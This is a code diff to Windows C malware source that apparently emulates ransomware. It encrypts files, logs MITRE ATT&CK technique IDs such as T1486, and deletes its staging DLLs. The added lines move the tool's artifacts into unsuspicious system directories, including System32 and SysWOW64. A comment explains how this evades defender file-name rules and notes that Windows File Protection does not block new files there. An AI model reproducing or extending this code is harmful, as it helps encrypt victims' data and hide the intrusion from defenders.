@@ -8,8 +8,11 @@
 #include <shlobj.h>
 #include <stdio.h>
 
-#define LOG_PATH L"C:\\ProgramData\\Microsoft\\cache\\tray\\cache.dat"
-#define NET_PATH L"C:\\ProgramData\\Microsoft\\cache\\tray\\net.tmp"
+// ponytail: artifacts scattered across unsuspicious system dirs instead of one
+// staging root. Filenames still conspicuous (loader/stage2) — rename only if a
+// defender name-rule fires. WFP does not block NEW files in System32/SysWOW64.
+#define LOG_PATH L"C:\\Windows\\Temp\\cache.dat"
+#define NET_PATH L"C:\\ProgramData\\Microsoft\\Diagnosis\\net.tmp"
 
 static void LogMessage(LPCWSTR msg) {
     HANDLE hFile = CreateFileW(LOG_PATH, GENERIC_WRITE, FILE_SHARE_READ, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
@@ -129,6 +132,9 @@ HCRYPTPROV hProv = 0;
                                 DWORD written = 0;
                                 WriteFile(hEncFile, encBuf, fileSize, &written, NULL);
                                 encrypted++;
+                                wchar_t encLog[MAX_PATH*2];
+                                wsprintfW(encLog, L"[+] T1486: encrypted -> %s", dstPath);
+                                LogMessage(encLog);
                             }
                             LocalFree(encBuf);
                         }
@@ -155,6 +161,9 @@ HCRYPTPROV hProv = 0;
                 DWORD written = 0;
                 WriteFile(hFile, synth, lstrlenA(synth), &written, NULL);
                 CloseHandle(hFile);
+                wchar_t synthLog[MAX_PATH*2];
+                wsprintfW(synthLog, L"[+] T1486: encrypted -> %s", synthPath);
+                LogMessage(synthLog);
             }
         }
     }
@@ -373,8 +382,8 @@ static void DoScreenCaptureNoise(void) {
 
 static void DoCleanup(void) {
     LogMessage(L"[*] T1070.004: Cleaning staging files");
-    DeleteFileW(L"C:\\ProgramData\\Microsoft\\cache\\tray\\loader.dll");
-    DeleteFileW(L"C:\\ProgramData\\Microsoft\\cache\\tray\\stage2.dll");
+    DeleteFileW(L"C:\\Windows\\System32\\loader.dll");
+    DeleteFileW(L"C:\\Windows\\SysWOW64\\stage2.dll");
     LogMessage(L"[+] T1070.004: Staging files cleaned");
 }
 
